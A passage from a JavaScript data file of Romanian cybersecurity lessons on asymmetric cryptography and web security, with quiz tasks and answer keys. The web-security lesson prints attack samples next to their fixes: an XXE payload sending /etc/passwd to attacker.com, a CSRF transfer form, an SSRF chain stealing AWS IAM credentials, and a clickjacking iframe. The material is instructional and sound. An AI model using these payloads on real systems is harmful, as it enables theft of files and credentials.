// Cybersecurity extra lessons 21-30

const cybersecExtra2 = [
  {
    slug: "criptografie-asimetrica",
    title: "21. Criptografie Asimetrica",
    order: 21,
    theory: [
      {
        order: 1,
        title: "RSA — principiu, chei, utilizare practica",
        content: "**Criptografia asimetrica** foloseste o pereche de chei: **publica** (distribuita liber) si **privata** (secreta).\n\n**RSA (Rivest–Shamir–Adleman):**\n- Bazat pe dificultatea factorizarii numerelor mari\n- Cheile: 2048 biti (minim), 4096 biti (recomandat)\n- Operatii: criptare cu cheie publica → decriptare cu cheie privata\n\n```bash\n# Generare pereche chei RSA cu OpenSSL:\nopenssl genrsa -out private.pem 4096\nopenssl rsa -in private.pem -pubout -out public.pem\n\n# Criptare fisier cu cheie publica:\nopenssl rsautl -encrypt -inkey public.pem -pubin -in secret.txt -out secret.enc\n\n# Decriptare cu cheie privata:\nopenssl rsautl -decrypt -inkey private.pem -in secret.enc -out decriptat.txt\n\n# Semnare digitala:\nopenssl dgst -sha256 -sign private.pem -out document.sig document.pdf\n\n# Verificare semnatura:\nopenssl dgst -sha256 -verify public.pem -signature document.sig document.pdf\n```\n\n**Cheia publica** = poti cripta, verifica semnaturi\n**Cheia privata** = poti decripta, semna\n\n**Interview tip:** RSA e lent — nu se foloseste pentru date mari. In practica: RSA cripteaza o cheie simetrica AES (hybrid encryption). TLS face exact asta."
      },
      {
        order: 2,
        title: "ECC (Elliptic Curve Cryptography) — mai mic si mai rapid",
        content: "**ECC** ofera aceeasi securitate ca RSA dar cu chei mult mai mici (256 biti ECC ≈ 3072 biti RSA).\n\n**Avantaje ECC:**\n- Chei mai mici → mai rapid, consum mai mic de resurse\n- Ideal pentru dispozitive mobile, IoT, TLS modern\n- Algoritmi: ECDSA (semnaturi), ECDH (schimb de chei)\n\n```bash\n# Generare cheie privata EC (curba P-256):\nopenssl ecparam -name prime256v1 -genkey -noout -out ec-private.pem\n\n# Extragere cheie publica:\nopenssl ec -in ec-private.pem -pubout -out ec-public.pem\n\n# ECDH — Elliptic Curve Diffie-Hellman:\n# Alice si Bob genereaza fiecare o pereche de chei\n# Schimba cheile publice\n# Fiecare calculeaza acelasi secret comun\n# (Alice private key + Bob public key = Bob private key + Alice public key)\n```\n\n```python\n# Python — generare si utilizare ECDSA:\nfrom cryptography.hazmat.primitives.asymmetric import ec\nfrom cryptography.hazmat.primitives import hashes\n\n# Generare cheie:\nchee_privata = ec.generate_private_key(ec.SECP256R1())\nchee_publica = chee_privata.public_key()\n\n# Semnare:\nsemnatura = chee_privata.sign(b\"mesaj important\", ec.ECDSA(hashes.SHA256()))\n\n# Verificare:\nchee_publica.verify(semnatura, b\"mesaj important\", ec.ECDSA(hashes.SHA256()))\nprint(\"Semnatura valida!\")\n```\n\n**Interview tip:** Ed25519 (varianta moderna ECC) e recomandata pentru SSH keys moderne. Comanda: ssh-keygen -t ed25519"
      },
      {
        order: 3,
        title: "TLS Handshake — cum functioneaza HTTPS",
        content: "**TLS (Transport Layer Security)** protejeaza comunicatia pe internet. HTTPS = HTTP + TLS.\n\n**TLS 1.3 Handshake (simplificat):**\n```\n1. Client Hello:\n   → versiune TLS, cipher suites suportate, random client\n\n2. Server Hello:\n   ← versiune aleasa, cipher suite aleasa, random server\n   ← certificat server (contine cheie publica)\n   ← Server Done\n\n3. Client verifica certificatul:\n   - Semnat de CA de incredere?\n   - Nu e expirat?\n   - Domeniu corespunde?\n\n4. Key Exchange (ECDHE):\n   → Client genereaza pre-master secret, il cripteaza cu cheia publica a serverului\n   ← Server decripteaza cu cheia privata\n   Ambii calculeaza session key simetric (AES)\n\n5. Finished:\n   → Client: \"folosesc cheia\" (criptat cu session key)\n   ← Server: \"si eu folosesc cheia\" (criptat)\n\n6. ★ De acum, tot traficul e criptat cu AES (simetric — rapid!)\n```\n\n```bash\n# Inspecteaza certificatul unui site:\nopenssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -text\n\n# Verifica data expirarii:\necho | openssl s_client -connect site.com:443 2>/dev/null |\n  openssl x509 -noout -enddate\n\n# Let's Encrypt — certificat SSL gratuit:\ncertbot --nginx -d example.com -d www.example.com\n```\n\n**Interview tip:** Perfect Forward Secrecy (PFS): cheia de sesiune e unica per conexiune (ECDHE). Daca cheia privata a serverului e compromisa ulterior, sesiunile vechi nu pot fi decriptate."
      },
      {
        order: 4,
        title: "Certificate, PKI si atacuri pe criptografie asimetrica",
        content: "**PKI (Public Key Infrastructure)** = sistemul de incredere pentru certificate digitale.\n\n**Certificat X.509 contine:**\n- Cheie publica\n- Identitate (domain, organizatie)\n- Perioada de valabilitate\n- Semnatura CA (Certificate Authority)\n\n**Lantul de incredere:**\n```\nRoot CA (trust anchor, in browser)\n  └── Intermediate CA\n        └── Server Certificate (ex: *.google.com)\n```\n\n**Atacuri pe PKI:**\n- **Man-in-the-Middle (MITM):** Atacatorul se interpune, prezinta un certificat fals\n  - Protectie: HSTS, Certificate Pinning, Certificate Transparency\n- **CA Compromise:** CA e spart → certificate false pentru orice domeniu\n  - Exemplu real: DigiNotar (2011) — spart, emis certificate false pentru *.google.com\n- **Certificate Pinning:** aplicatia accepta doar certificate specifice (mobile apps)\n\n```python\n# Verificare certificat in Python:\nimport ssl, socket\n\ndef verifica_cert(hostname, port=443):\n    ctx = ssl.create_default_context()\n    conn = ctx.wrap_socket(socket.socket(), server_hostname=hostname)\n    conn.connect((hostname, port))\n    cert = conn.getpeercert()\n    print(f\"Emitent: {cert['issuer']}\")\n    print(f\"Valabil pana: {cert['notAfter']}\")\n    conn.close()\n\nverifica_cert('google.com')\n```\n\n**Interview tip:** Certificate Transparency (CT) = log public unde toate CA-urile trebuie sa inregistreze certificatele emise. Browserele verifica CA-urile in CT logs."
      }
    ],
    tasks: [
      {
        number: 1,
        name: "Cheie publica vs privata",
        question: "Ce operatii se fac cu cheia PUBLICA si ce operatii cu cheia PRIVATA in criptografia asimetrica?",
        options: [
          "Publica: decriptare; Privata: criptare",
          "Publica: criptare + verificare semnatura; Privata: decriptare + semnare",
          "Ambele fac aceleasi operatii",
          "Publica: semnare; Privata: verificare"
        ],
        answer: "Publica: criptare + verificare semnatura; Privata: decriptare + semnare",
        explanation: "Oricine poate cripta cu cheia publica — doar proprietarul cheii private poate decripta. Proprietarul semneaza cu privata — oricine verifica cu publica.",
        difficulty: "medium"
      },
      {
        number: 2,
        name: "RSA vs ECC",
        question: "De ce ECC este preferata fata de RSA in aplicatiile moderne?",
        options: [
          "ECC e mai veche si mai testata",
          "ECC ofera securitate echivalenta cu chei mult mai mici — mai rapid, consum mai mic de resurse",
          "RSA nu mai e sigur",
          "ECC e mai simplu de implementat"
        ],
        answer: "ECC ofera securitate echivalenta cu chei mult mai mici — mai rapid, consum mai mic de resurse",
        explanation: "256 biti ECC ≈ 3072 biti RSA. Avantaj crucial pentru TLS modern, mobile, IoT unde resursele sunt limitate.",
        difficulty: "medium"
      },
      {
        number: 3,
        name: "TLS handshake",
        question: "De ce TLS foloseste criptografie asimetrica in handshake dar simetrica (AES) pentru datele reale?",
        options: [
          "AES nu e sigur",
          "Criptografia asimetrica e mult mai lenta — se foloseste doar pentru schimbul securizat al cheii AES de sesiune",
          "Browserele nu suporta AES",
          "RSA nu suporta date mari"
        ],
        answer: "Criptografia asimetrica e mult mai lenta — se foloseste doar pentru schimbul securizat al cheii AES de sesiune",
        explanation: "RSA/ECC: sute de ori mai lent decat AES. Hybrid encryption: asimetric schimba cheia, simetric (AES) cripteaza datele.",
        difficulty: "medium"
      },
      {
        number: 4,
        name: "Perfect Forward Secrecy",
        question: "Ce garanteaza Perfect Forward Secrecy (PFS) in TLS?",
        options: [
          "Cheia privata nu poate fi furata",
          "Chiar daca cheia privata a serverului e compromisa mai tarziu, sesiunile vechi inregistrate nu pot fi decriptate",
          "Sesiunile sunt criptate de doua ori",
          "Certificatele sunt mereu valide"
        ],
        answer: "Chiar daca cheia privata a serverului e compromisa mai tarziu, sesiunile vechi inregistrate nu pot fi decriptate",
        explanation: "ECDHE genereaza chei de sesiune unice per conexiune. Cheia de sesiune nu e derivata direct din cheia privata a serverului.",
        difficulty: "hard"
      },
      {
        number: 5,
        name: "Certificate Authority",
        question: "Ce s-a intamplat in cazul DigiNotar (2011) si de ce a fost critic?",
        options: [
          "Si-au expirat certificatele",
          "CA-ul a fost compromis si a emis certificate false pentru domenii Google — MITM la scara nationala posibil",
          "Au falimentat",
          "Au pierdut cheile private"
        ],
        answer: "CA-ul a fost compromis si a emis certificate false pentru domenii Google — MITM la scara nationala posibil",
        explanation: "Atacatorii iranieni au obtinut certificate *.google.com de la DigiNotar spart. Browserele au revocat imediat increderea in DigiNotar. CA compromise = catastrofa PKI.",
        difficulty: "hard"
      },
      {
        number: 6,
        name: "SSH key generation",
        question: "Genereaza o pereche de chei SSH moderne (Ed25519) si adauga cheia publica pe un server.",
        type: "coding",
        language: "bash",
        starterCode: "# Genereaza pereche de chei Ed25519\n# Adauga comentariu cu email-ul\n# Copiaza cheia publica pe server (user@server.com)\n# Hint: ssh-keygen si ssh-copy-id",
        options: [],
        answer: "",
        explanation: "ssh-keygen -t ed25519 -C \"email@example.com\" -f ~/.ssh/id_ed25519; ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server.com",
        difficulty: "easy",
        expectedOutput: ""
      },
      {
        number: 7,
        name: "HSTS",
        question: "Ce face HSTS (HTTP Strict Transport Security) si cum previne atacuri?",
        options: [
          "Cripteaza traficul",
          "Instruieste browserul sa foloseasca HTTPS mereu pentru domeniu — previne SSL stripping si downgrade attacks",
          "Verifica certificatele",
          "Configureaza TLS version"
        ],
        answer: "Instruieste browserul sa foloseasca HTTPS mereu pentru domeniu — previne SSL stripping si downgrade attacks",
        explanation: "SSL stripping: atacatorul MITM transforma HTTPS in HTTP. HSTS: browserul refuza sa trimita request HTTP la domeniu, merge direct la HTTPS.",
        difficulty: "medium"
      },
      {
        number: 8,
        name: "Semnatura digitala scop",
        question: "Ce garanteaza o semnatura digitala?",
        options: [
          "Confidentialitate",
          "Autenticitate (cine a semnat) + Integritate (documentul nu a fost modificat) + Non-repudiere",
          "Criptare",
          "Doar integritate"
        ],
        answer: "Autenticitate (cine a semnat) + Integritate (documentul nu a fost modificat) + Non-repudiere",
        explanation: "Semnatura = hash al documentului criptat cu cheia privata. Verifici cu cheia publica. Daca documentul s-a schimbat, hash-ul nu se potriveste.",
        difficulty: "medium"
      },
      {
        number: 9,
        name: "inspect certificate",
        question: "Scrie comanda OpenSSL pentru a vizualiza detaliile certificatului TLS al site-ului github.com.",
        type: "coding",
        language: "bash",
        starterCode: "# Conecteaza-te la github.com:443 si afiseaza certificatul\n# Afiseaza: emitent, valabilitate, subject\n# Hint: openssl s_client si openssl x509",
        options: [],
        answer: "",
        explanation: "echo | openssl s_client -connect github.com:443 2>/dev/null | openssl x509 -noout -text -in /dev/stdin",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 10,
        name: "Hybrid encryption",
        question: "Explica conceptul de Hybrid Encryption — cum combina criptografia simetrica si asimetrica.",
        options: [
          "Folosesti doua chei asimetrice",
          "Cheia de sesiune simetrica (AES) e criptata cu cheia asimetrica (RSA/ECC); datele sunt criptate cu AES",
          "Datele sunt criptate de doua ori",
          "Nu exista combinare posibila"
        ],
        answer: "Cheia de sesiune simetrica (AES) e criptata cu cheia asimetrica (RSA/ECC); datele sunt criptate cu AES",
        explanation: "Asimetric e sigur dar lent; simetric e rapid dar trebuie distribuit securizat. Hybrid: asimetric distribuie cheia AES, AES cripteaza datele. Exact cum functioneaza TLS.",
        difficulty: "medium"
      },
      {
        number: 11,
        name: "Certificate Transparency",
        question: "Ce este Certificate Transparency si ce problema rezolva?",
        options: [
          "Un tip de certificat",
          "Un log public si auditable unde CA-urile inregistreaza toate certificatele emise — detecteaza certificate frauduloase",
          "O versiune de TLS",
          "Un tip de firewall"
        ],
        answer: "Un log public si auditable unde CA-urile inregistreaza toate certificatele emise — detecteaza certificate frauduloase",
        explanation: "Oricine poate verifica daca un certificat apare in CT logs. Daca Google primeste un certificat nesolicitat pentru google.com, il detecteaza in CT.",
        difficulty: "hard"
      },
      {
        number: 12,
        name: "RSA key size",
        question: "De ce nu se recomanda RSA cu chei de 1024 biti in 2025?",
        options: [
          "1024 biti nu sunt suportati de OpenSSL",
          "1024 biti pot fi factorizati cu resurse computationale moderne — NIST recomanda minim 2048 biti",
          "1024 biti sunt prea mari",
          "1024 biti nu suporta SHA-256"
        ],
        answer: "1024 biti pot fi factorizati cu resurse computationale moderne — NIST recomanda minim 2048 biti",
        explanation: "In 2010, o cheie RSA-1024 a fost factorizata cu resurse accesibile. NIST: minim 2048 biti pana in 2030, 3072+ pentru dupa 2030.",
        difficulty: "medium"
      },
      {
        number: 13,
        name: "Python cert verify",
        question: "Scrie un script Python care verifica daca certificatul TLS al unui site este valid si afiseaza data expirarii.",
        type: "coding",
        language: "python",
        starterCode: "import ssl\nimport socket\nfrom datetime import datetime\n\ndef verifica_certificat(hostname, port=443):\n    # conecteaza la host\n    # extrage certificatul\n    # afiseaza: emitent, data expirare\n    # returneaza True daca valid, False altfel\n    pass\n\nverifica_certificat('google.com')",
        options: [],
        answer: "",
        explanation: "ctx = ssl.create_default_context(); conn = ctx.wrap_socket(socket.socket(), server_hostname=hostname); conn.connect((hostname, port)); cert = conn.getpeercert(); print(cert['notAfter']); conn.close()",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 14,
        name: "Quantum computing impact",
        question: "Ce impact are viitorul computing cuantic asupra RSA si ECC?",
        options: [
          "Nu are niciun impact",
          "Algoritmul Shor ruleaza pe computere cuantice poate factoriza RSA si rezolva ECDLP — ambele devin vulnerabile",
          "Doar ECC e vulnerabila",
          "Quantum computers nu vor fi niciodata suficient de puternice"
        ],
        answer: "Algoritmul Shor ruleaza pe computere cuantice poate factoriza RSA si rezolva ECDLP — ambele devin vulnerabile",
        explanation: "NIST standardizeaza post-quantum cryptography: CRYSTALS-Kyber (key exchange) si CRYSTALS-Dilithium (semnaturi) sunt rezistente la atacuri cuantice.",
        difficulty: "hard"
      },
      {
        number: 15,
        name: "Let's Encrypt",
        question: "Ce este Let's Encrypt si ce problema rezolva?",
        options: [
          "Un tip de criptare simetrica",
          "O CA gratuita si automatizata care emite certificate TLS — elimina costul si complexitatea certificatelor SSL",
          "Un tool de pentest",
          "Un protocol de securitate"
        ],
        answer: "O CA gratuita si automatizata care emite certificate TLS — elimina costul si complexitatea certificatelor SSL",
        explanation: "Let's Encrypt + Certbot: certificat gratuit, instalare automata, reinnoire automata la 90 de zile. A democratizat HTTPS — >300 milioane certificate active.",
        difficulty: "easy"
      }
    ]
  },
  {
    slug: "web-security-advanced",
    title: "22. Securitatea Aplicatiilor Web Avansate",
    order: 22,
    theory: [
      {
        order: 1,
        title: "CSRF (Cross-Site Request Forgery) — mecanism si protectie",
        content: "**CSRF** = fortezi un utilizator autentificat sa execute actiuni nedorite intr-o aplicatie web.\n\n**Cum functioneaza:**\n```html\n<!-- Site malitios (evil.com) — utilizatorul e logat pe banca.ro -->\n<img src=\"https://banca.ro/transfer?la=atacator&suma=5000\" />\n<!-- Sau un form auto-submitted: -->\n<form action=\"https://banca.ro/transfer\" method=\"POST\" id=\"f\">\n  <input name=\"la\" value=\"atacator123\">\n  <input name=\"suma\" value=\"5000\">\n</form>\n<script>document.getElementById('f').submit()</script>\n<!-- Browserul trimite automat cookie-ul de sesiune! -->\n```\n\n**Protectii:**\n```javascript\n// 1. CSRF Token (sincronizat):\n// Server genereaza token unic per sesiune:\nconst csrfToken = crypto.randomBytes(32).toString('hex');\nreq.session.csrfToken = csrfToken;\n\n// Include in form:\n// <input type=\"hidden\" name=\"_csrf\" value=\"{{ csrfToken }}\">\n\n// Verifica la POST:\nif (req.body._csrf !== req.session.csrfToken) {\n    return res.status(403).json({ error: 'CSRF token invalid' });\n}\n\n// 2. SameSite Cookie Attribute:\nres.cookie('sessionId', token, {\n    httpOnly: true,\n    secure: true,\n    sameSite: 'Strict'  // sau 'Lax'\n});\n// SameSite=Strict: cookie-ul NU e trimis in request-uri cross-site\n// SameSite=Lax: cookie-ul NU e trimis in POST cross-site (dar e trimis la navigare GET)\n\n// 3. Custom request header (pentru AJAX/SPA):\n// fetch('/api/transfer', {\n//   method: 'POST',\n//   headers: { 'X-Requested-With': 'XMLHttpRequest' }\n// });\n// Browserul nu adauga automat headere custom in request-uri cross-origin\n```\n\n**Interview tip:** REST API-urile cu JWT nu au nevoie de CSRF tokens (JWT nu e cookie). SameSite=Strict e protectia moderna. csurf (npm) e deprecat din 2024."
      },
      {
        order: 2,
        title: "XXE si SSRF avansate — impact real si chain attacks",
        content: "**XXE** in real-world scenarii:\n\n```xml\n<!-- XXE pentru exfiltrare date prin Out-of-Band (OOB):\n    Serverul face o cerere catre serverul atacatorului cu datele:\n<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n  <!ENTITY % exfil SYSTEM \"http://attacker.com/steal?data=\">\n  <!ENTITY % content SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % combine \"<!ENTITY send SYSTEM 'http://attacker.com/?d=%content;'>\">\n  %combine;\n]>\n<data>&send;</data>\n-->\n\n<!-- Fix: dezactiveaza entitati externe pentru ORICE parser XML -->\n```\n\n```java\n// Java — XMLInputFactory securizat:\nXMLInputFactory factory = XMLInputFactory.newInstance();\nfactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);\nfactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);\n```\n\n**SSRF Chain Attacks — AWS EC2:**\n```http\n# Pas 1 — SSRF acces metadata:\nGET http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n# Raspuns: lista de roluri IAM\n\n# Pas 2 — obtine credentialele rolului:\nGET http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2RoleName\n# Raspuns: { AccessKeyId, SecretAccessKey, Token, Expiration }\n\n# Pas 3 — foloseste credentialele AWS:\nAWS_ACCESS_KEY_ID=ASIA... aws s3 ls  # acces la toti S3 buckets!\n\n# Protectie moderna: IMDSv2 (Instance Metadata Service v2)\n# Necesita PUT request pt token inainte de GET — SSRF simplu nu mai functioneaza\n```\n\n**Interview tip:** SSRF + Cloud Metadata e categoria vulnerabilitatilor cu cel mai mare impact in bug bounty in 2024."
      },
      {
        order: 3,
        title: "Security Headers — protectie la nivel de browser",
        content: "**Security Headers** instruiesc browserul sa aplice politici de securitate suplimentare.\n\n```javascript\n// Express.js — toate headerele importante:\nconst helmet = require('helmet');\napp.use(helmet()); // seteaza automat headerele de baza\n\n// Sau manual:\n\n// 1. Content-Security-Policy (CSP) — previne XSS:\napp.use((req, res, next) => {\n    res.setHeader('Content-Security-Policy',\n        \"default-src 'self'; \" +\n        \"script-src 'self' https://trusted-cdn.com; \" +\n        \"style-src 'self' 'unsafe-inline'; \" +\n        \"img-src 'self' data: https:; \" +\n        \"connect-src 'self' https://api.example.com; \" +\n        \"frame-ancestors 'none'\"  // previne clickjacking\n    );\n    next();\n});\n\n// 2. X-Frame-Options — previne clickjacking:\nres.setHeader('X-Frame-Options', 'DENY'); // sau 'SAMEORIGIN'\n// Modern: frame-ancestors in CSP\n\n// 3. X-Content-Type-Options — previne MIME sniffing:\nres.setHeader('X-Content-Type-Options', 'nosniff');\n\n// 4. Referrer-Policy:\nres.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');\n\n// 5. Permissions-Policy (fost Feature-Policy):\nres.setHeader('Permissions-Policy',\n    'camera=(), microphone=(), geolocation=(self)'\n);\n\n// 6. HSTS:\nres.setHeader('Strict-Transport-Security',\n    'max-age=31536000; includeSubDomains; preload'\n);\n```\n\n**Verificare:** securityheaders.com — analizeaza headerele unui site.\n\n**Interview tip:** CSP e cel mai puternic — permite o lista alba de surse de continut. 'unsafe-inline' dezactiveaza protectia XSS — evita!"
      },
      {
        order: 4,
        title: "Clickjacking, Open Redirect si HTTP Parameter Pollution",
        content: "**Clickjacking:**\n```html\n<!-- Atacatorul incarcteaza site-ul victima intr-un iframe invizibil\n     si plaseaza butoane false deasupra: -->\n<iframe src=\"https://banca.ro/confirma-transfer\" style=\"opacity:0; position:absolute;\"></iframe>\n<button style=\"position:absolute\">Castiga iPhone!</button>\n<!-- Utilizatorul crede ca apasa pe butonul fals dar apasa pe Transfer! -->\n\n<!-- Protectie: X-Frame-Options sau CSP frame-ancestors: -->\n<!-- Strict-Transport-Security: ... -->\n<!-- X-Frame-Options: DENY -->\n<!-- sau: Content-Security-Policy: frame-ancestors 'none' -->\n```\n\n**Open Redirect:**\n```javascript\n// ❌ Vulnerabil:\napp.get('/redirect', (req, res) => {\n    res.redirect(req.query.url); // oricine poate redirecta la phishing!\n});\n// Atac: site-legitim.com/redirect?url=http://phishing.com\n// Utilizatorul vede URL-ul legitim si are incredere!\n\n// ✅ Fix — allow-list:\nconst ALLOWED = ['https://app.example.com', 'https://docs.example.com'];\napp.get('/redirect', (req, res) => {\n    const dest = req.query.url;\n    if (!ALLOWED.includes(dest)) {\n        return res.redirect('/home');\n    }\n    res.redirect(dest);\n});\n```\n\n**HTTP Parameter Pollution:**\n```http\n# Trimitere multipla a aceluiasi parametru:\nGET /search?sort=name&sort=admin_field\n# Framework-uri diferite parseaza diferit:\n# PHP: $_GET['sort'] = 'admin_field' (ultimul)\n# Express.js: req.query.sort = ['name', 'admin_field'] (array)\n# ASP.NET: req.QueryString['sort'] = 'name,admin_field' (concat)\n# Poate bypassa validari sau injecta valori neasteptate!\n```\n\n**Interview tip:** Open Redirect e frecvent in phishing — URL-ul legitim in email (pentru bypass filtru) care redirecteaza la phishing. OWASP il include in Top 10."
      }
    ],
    tasks: [
      {
        number: 1,
        name: "CSRF mecanism",
        question: "De ce CSRF functioneaza — ce exploateaza?",
        options: [
          "XSS vulnerabilitate",
          "Browserul trimite automat cookie-urile de sesiune la orice request catre un domeniu, inclusiv din pagini third-party",
          "Parole slabe",
          "SQL injection"
        ],
        answer: "Browserul trimite automat cookie-urile de sesiune la orice request catre un domeniu, inclusiv din pagini third-party",
        explanation: "Daca esti logat pe banca.ro, orice pagina malitioasa poate face un request catre banca.ro si browserul adauga automat cookie-ul de sesiune.",
        difficulty: "medium"
      },
      {
        number: 2,
        name: "SameSite cookie",
        question: "Ce face SameSite=Strict pe un cookie?",
        options: [
          "Cripteaza cookie-ul",
          "Cookie-ul NU este trimis in niciun request cross-site — protectie completa CSRF dar poate rupe flow-uri de autentificare externe",
          "Cookie-ul nu expira niciodata",
          "Cookie-ul e doar pentru HTTPS"
        ],
        answer: "Cookie-ul NU este trimis in niciun request cross-site — protectie completa CSRF dar poate rupe flow-uri de autentificare externe",
        explanation: "SameSite=Strict: nici macar la click pe un link din alt site cookie-ul nu e trimis. Lax: trimis la navigare TOP-level GET dar nu la POST/iframe cross-site.",
        difficulty: "medium"
      },
      {
        number: 3,
        name: "CSP scop",
        question: "Ce atac previne in principal Content-Security-Policy (CSP)?",
        options: [
          "SQL Injection",
          "XSS — restrictioneaza sursele de scripturi, stiluri, imagini pe care browserul le poate incarca si executa",
          "CSRF",
          "Brute force"
        ],
        answer: "XSS — restrictioneaza sursele de scripturi, stiluri, imagini pe care browserul le poate incarca si executa",
        explanation: "CSP cu script-src 'self' blocheaza executia oricarui script injectat (XSS) daca nu vine de la domeniu propriu. Chiar si inline scripts sunt blocate fara 'unsafe-inline'.",
        difficulty: "medium"
      },
      {
        number: 4,
        name: "Clickjacking fix",
        question: "Cum previi clickjacking?",
        options: [
          "CSRF token",
          "X-Frame-Options: DENY sau CSP: frame-ancestors 'none' — impiedica site-ul sa fie incarcat intr-un iframe",
          "HTTPS",
          "Rate limiting"
        ],
        answer: "X-Frame-Options: DENY sau CSP: frame-ancestors 'none' — impiedica site-ul sa fie incarcat intr-un iframe",
        explanation: "frame-ancestors 'none' e metoda moderna (parte din CSP). X-Frame-Options e legacy dar inca suportat. Ambele spun browserului sa refuze iframe-ul.",
        difficulty: "easy"
      },
      {
        number: 5,
        name: "Open redirect danger",
        question: "De ce Open Redirect e periculos in contextul phishing-ului?",
        options: [
          "Redirecteaza la erori server",
          "URL-ul initial pare legitim (site-ul real) — trece de filtrele anti-phishing din emailuri si creste increderea victimei",
          "Cauzeaza DoS",
          "Expune date de sesiune"
        ],
        answer: "URL-ul initial pare legitim (site-ul real) — trece de filtrele anti-phishing din emailuri si creste increderea victimei",
        explanation: "Email cu link: https://banca-reala.ro/redirect?url=https://banca-reala-phishing.com — URL-ul din email e legitim, filtrul de spam il trece.",
        difficulty: "medium"
      },
      {
        number: 6,
        name: "Security headers implementation",
        question: "Scrie middleware Express.js care seteaza manual headerele de securitate esentiale: X-Frame-Options, X-Content-Type-Options, Referrer-Policy.",
        type: "coding",
        language: "javascript",
        starterCode: "const express = require('express');\nconst app = express();\n\n// Middleware pentru security headers\nfunction securityHeaders(req, res, next) {\n    // seteaza X-Frame-Options, X-Content-Type-Options, Referrer-Policy\n    next();\n}\n\napp.use(securityHeaders);",
        options: [],
        answer: "",
        explanation: "res.setHeader('X-Frame-Options', 'DENY'); res.setHeader('X-Content-Type-Options', 'nosniff'); res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 7,
        name: "CSRF token implementation",
        question: "Implementeaza generarea si verificarea unui CSRF token intr-un middleware Express.js.",
        type: "coding",
        language: "javascript",
        starterCode: "const crypto = require('crypto');\n\n// Genereaza CSRF token si salveaza in sesiune\nfunction generateCsrf(req, res, next) {\n    // genereaza token random hex de 32 bytes daca nu exista\n    // salveaza in req.session.csrfToken\n    next();\n}\n\n// Verifica CSRF token pentru metodele POST/PUT/DELETE\nfunction verifyCsrf(req, res, next) {\n    // compara req.body._csrf cu req.session.csrfToken\n}",
        options: [],
        answer: "",
        explanation: "if (!req.session.csrfToken) req.session.csrfToken = crypto.randomBytes(32).toString('hex'); // verify: if (req.body._csrf !== req.session.csrfToken) return res.status(403).json({error:'CSRF invalid'});",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 8,
        name: "XXE fix Java",
        question: "Cum dezactivezi procesarea entitatilor externe in Java XMLInputFactory?",
        options: [
          "Nu se poate dezactiva",
          "factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false) + SUPPORT_DTD, false",
          "Folosesti o versiune mai veche de Java",
          "Criptezi XML-ul"
        ],
        answer: "factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false) + SUPPORT_DTD, false",
        explanation: "Ambele setari sunt necesare: IS_SUPPORTING_EXTERNAL_ENTITIES dezactiveaza entitati, SUPPORT_DTD dezactiveaza incarcare DTD externe.",
        difficulty: "medium"
      },
      {
        number: 9,
        name: "IMDSv2 SSRF protection",
        question: "Cum protejeaza IMDSv2 (Instance Metadata Service v2) impotriva SSRF in AWS?",
        options: [
          "Blocheaza toate request-urile externe",
          "Necesita un PUT request cu TTL pentru a obtine un token sesiune inainte de orice GET — SSRF-ul simplu nu poate face PUT",
          "Cripteaza datele de metadata",
          "Necesita autentificare AWS"
        ],
        answer: "Necesita un PUT request cu TTL pentru a obtine un token sesiune inainte de orice GET — SSRF-ul simplu nu poate face PUT",
        explanation: "SSRF clasic face GET la 169.254.169.254. IMDSv2: intai PUT cu X-aws-ec2-metadata-token-ttl-seconds header, primesti token, folosesti token la GET. SSRF basic-GET e blocat.",
        difficulty: "hard"
      },
      {
        number: 10,
        name: "unsafe-inline CSP",
        question: "De ce 'unsafe-inline' in script-src dezactiveaza in mare parte protectia CSP impotriva XSS?",
        options: [
          "Nu dezactiveaza nimic",
          "Permite executia oricarui script inline — inclusiv scripturi injectate prin XSS — eliminand avantajul CSP",
          "Creste performanta",
          "E necesar pentru React"
        ],
        answer: "Permite executia oricarui script inline — inclusiv scripturi injectate prin XSS — eliminand avantajul CSP",
        explanation: "CSP fara 'unsafe-inline': chiar daca atacatorul injecteaza <script>alert(1)</script>, browserul il blocheaza. Cu 'unsafe-inline': scriptul se executa.",
        difficulty: "medium"
      },
      {
        number: 11,
        name: "MIME sniffing",
        question: "Ce atac previne X-Content-Type-Options: nosniff?",
        options: [
          "XSS",
          "MIME sniffing — browserul nu mai ghiceste tipul fisierului; daca serverul spune text/plain, browserul nu-l executa ca script",
          "CSRF",
          "Clickjacking"
        ],
        answer: "MIME sniffing — browserul nu mai ghiceste tipul fisierului; daca serverul spune text/plain, browserul nu-l executa ca script",
        explanation: "Fara nosniff: atacatorul upleaza un fisier .txt cu continut JavaScript — browserul il detecteaza ca script si il executa. nosniff: browserul respecta Content-Type.",
        difficulty: "medium"
      },
      {
        number: 12,
        name: "Open redirect fix",
        question: "Scrie un middleware Express care valideaza redirect URL-ul folosind o allow-list si previne open redirect.",
        type: "coding",
        language: "javascript",
        starterCode: "const ALLOWED_REDIRECTS = [\n    'https://app.example.com',\n    'https://docs.example.com',\n    '/dashboard',\n    '/profile'\n];\n\napp.get('/redirect', (req, res) => {\n    const dest = req.query.url;\n    // valideaza cu allow-list si redirecteaza sau mergi la /home\n});",
        options: [],
        answer: "",
        explanation: "if (!dest || !ALLOWED_REDIRECTS.includes(dest)) return res.redirect('/home'); res.redirect(dest);",
        difficulty: "easy",
        expectedOutput: ""
      },
      {
        number: 13,
        name: "Permissions-Policy",
        question: "Ce face headerul Permissions-Policy (fost Feature-Policy)?",
        options: [
          "Seteaza permisiunile de fisiere",
          "Controleaza accesul la API-uri browser (camera, microfon, GPS) pentru pagina si iframe-uri",
          "Configureaza CORS",
          "Seteaza permisiunile de autentificare"
        ],
        answer: "Controleaza accesul la API-uri browser (camera, microfon, GPS) pentru pagina si iframe-uri",
